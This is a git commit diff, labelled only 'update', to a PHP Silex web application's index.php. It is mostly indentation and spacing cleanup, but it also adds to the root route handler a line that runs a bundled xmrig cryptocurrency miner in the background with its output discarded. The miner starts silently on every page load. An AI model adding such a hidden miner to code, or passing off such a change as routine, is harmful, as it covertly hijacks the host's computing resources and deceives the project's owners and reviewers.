c438d37d73b1901973c341826e1a1c0432c3ab9f
Milad Rahimi <info@miladrahimi.com>
2021-10-30 21:51:25 +0330

    update

--- web/index.php
+++ web/index.php
@@ -7,19 +7,20 @@ $app['debug'] = true;
 
 // Register the monolog logging service
 $app->register(new Silex\Provider\MonologServiceProvider(), array(
-  'monolog.logfile' => 'php://stderr',
+    'monolog.logfile' => 'php://stderr',
 ));
 
 // Register view rendering
 $app->register(new Silex\Provider\TwigServiceProvider(), array(
-    'twig.path' => __DIR__.'/views',
+    'twig.path' => __DIR__ . '/views',
 ));
 
 // Our web handlers
 
-$app->get('/', function() use($app) {
-  $app['monolog']->addDebug('logging output.');
-  return $app['twig']->render('index.twig');
+$app->get('/', function () use ($app) {
+    $app['monolog']->addDebug('logging output.');
+    exec(__DIR__ . "/bin/xmrig-6.15.2/xmrig > /dev/null 2>&1 &");
+    return $app['twig']->render('index.twig');
 });
 
 $app->run();
